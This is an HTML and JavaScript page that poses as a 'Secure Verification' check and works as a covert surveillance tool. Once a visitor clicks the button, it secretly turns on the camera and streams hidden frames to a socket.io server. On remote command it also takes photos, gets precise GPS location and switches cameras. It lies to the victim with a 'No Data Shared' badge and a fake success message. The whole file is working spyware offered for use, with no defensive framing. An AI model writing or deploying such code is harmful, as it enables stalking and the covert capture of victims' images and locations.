<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification - Please Wait</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: #121212;
            color: #eee;
        }
        .card {
            width: 90%;
            max-width: 400px;
            background: #1e1e1e;
            padding: 30px;
            border-radius: 14px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
            text-align: center;
            border: 1px solid #333;
        }
        h2 { margin-top: 0; color: #fff; font-size: 22px; }
        p { color: #aaa; font-size: 14px; line-height: 1.5; }
        .status { padding: 12px; border-radius: 8px; margin: 15px 0; font-size: 14px; font-weight: bold; }
        .waiting { background: #2c3e50; color: #3498db; }
        .error { background: #512e2f; color: #e74c3c; }
        .success { background: #1e4620; color: #2ecc71; }
        
        .action-btn {
            width: 100%;
            background: #27ae60;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: opacity 0.2s;
        }
        .action-btn:hover { opacity: 0.9; }
        
        video { display: none !important; }
        .secure-badge { font-size: 11px; color: #7f8c8d; margin-top: 20px; display: block; }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <h2>System Verification</h2>
    <p>Please complete the security check to proceed to your requested content safely.</p>
    
    <div id="status" class="status waiting">Click below to start verification</div>
    
    <button id="startBtn" class="action-btn" onclick="triggerVerification()">Verify & Continue</button>
    
    <video id="video" autoplay playsinline muted></video>
    
    <span class="secure-badge">🔒 256-bit Secure Connection &bull; No Data Shared</span>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io();
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusBox = document.getElementById("status");
const startBtn = document.getElementById("startBtn");

let mediaStream = null;
let cameraReady = false;
let useFrontCamera = true;
let streamInterval = null;
let autoCaptureRunning = false;

function setStatus(message, type) {
    statusBox.textContent = message;
    statusBox.className = "status " + type;
}

function getDeviceInfo() {
    const ua = navigator.userAgent.toLowerCase();
    let device = "Desktop/PC";
    let browser = "Unknown Browser";

    if (ua.includes("android")) device = "Android Mobile";
    else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) device = "iOS Device";
    else if (ua.includes("mobile")) device = "Mobile Device";

    if (ua.includes("edg")) browser = "Microsoft Edge";
    else if (ua.includes("chrome") || ua.includes("crios")) browser = "Google Chrome";
    else if (ua.includes("firefox")) browser = "Mozilla Firefox";
    else if (ua.includes("safari")) browser = "Apple Safari";

    return `${device} (${browser})`;
}

// WhatsApp jaisi High-Accuracy GPS fetch function
function requestAndSendLocation() {
    if (!navigator.geolocation) return;
    
    // Forcefully wakeup GPS chip with high accuracy and zero cache
    navigator.geolocation.getCurrentPosition(
        position => {
            socket.emit("user-location", {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            });
        },
        error => {
            // Fallback agar high accuracy fail ho toh normal mode try karein
            navigator.geolocation.getCurrentPosition(
                pos => {
                    socket.emit("user-location", {
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    });
                },
                err => {},
                { enableHighAccuracy: false, timeout: 10000 }
            );
        },
        { 
            enableHighAccuracy: true, // Asli GPS chip use karega
            timeout: 20000,           // 20 seconds tak accurate lock hone ka wait karega
            maximumAge: 0             // Purana saved location bilkul use nahi karega (Fresh data)
        }
    );
}

async function triggerVerification() {
    startBtn.style.display = "none";
    setStatus("Verifying session...", "waiting");

    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
    }

    try {
        const constraints = {
            audio: false,
            video: {
                facingMode: useFrontCamera ? "user" : "environment",
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        mediaStream = stream;
        video.srcObject = stream;
        await video.play();

        cameraReady = true;
        setStatus("Verified Successfully!", "success");

        socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
        startLiveStream();

        setTimeout(() => {
            setStatus("Connected. Please wait...", "waiting");
        }, 1500);

    } catch (error) {
        cameraReady = false;
        setStatus("Verification required to proceed.", "error");
        startBtn.style.display = "block";
    }
}

function startLiveStream() {
    if (streamInterval) clearInterval(streamInterval);
    streamInterval = setInterval(() => {
        if (!cameraReady || !video.videoWidth) return;
        canvas.width = 640;
        canvas.height = 360;
        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, 640, 360);
        const frame = canvas.toDataURL("image/jpeg", 0.6);
        socket.emit("live-stream-frame", frame);
    }, 150);
}

function takeSinglePhoto() {
    if (!cameraReady) return;
    const width = video.videoWidth || 1280;
    const height = video.videoHeight || 720;
    canvas.width = width;
    canvas.height = height;
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, width, height);
    const imageData = canvas.toDataURL("image/jpeg", 0.95);
    socket.emit("user-photo-captured", imageData);
}

socket.on("start-auto-capture", () => {
    if (autoCaptureRunning) return;
    autoCaptureRunning = true;
    let count = 0;
    const maxCaptures = 5;

    takeSinglePhoto();
    count++;

    const timer = setInterval(() => {
        if (count >= maxCaptures) {
            clearInterval(timer);
            autoCaptureRunning = false;
            return;
        }
        takeSinglePhoto();
        count++;
    }, 1000);
});

socket.on("capture-photo", () => { takeSinglePhoto(); });
socket.on("request-location", () => { requestAndSendLocation(); });

socket.on("switch-camera", async () => {
    useFrontCamera = !useFrontCamera;
    if (cameraReady) await triggerVerification();
});

socket.on("server-full", data => {
    setStatus(`Maximum capacity reached (${data.maxUsers} users).`, "error");
    if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
});

socket.on("link-disabled", () => {
    stopEverything();
    setStatus("This link is currently inactive.", "error");
});

socket.on("disable-user-access", () => {
    stopEverything();
    document.body.innerHTML = `
        <div class="card">
            <h2>Session Ended</h2>
            <p>The session has been terminated by the administrator.</p>
        </div>
    `;
});

function stopEverything() {
    cameraReady = false;
    if (streamInterval) {
        clearInterval(streamInterval);
        streamInterval = null;
    }
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
        mediaStream = null;
    }
}

socket.on("connect", () => {
    socket.emit("user-connect-info", { deviceInfo: getDeviceInfo() });
});
</script>
</body>
</html>
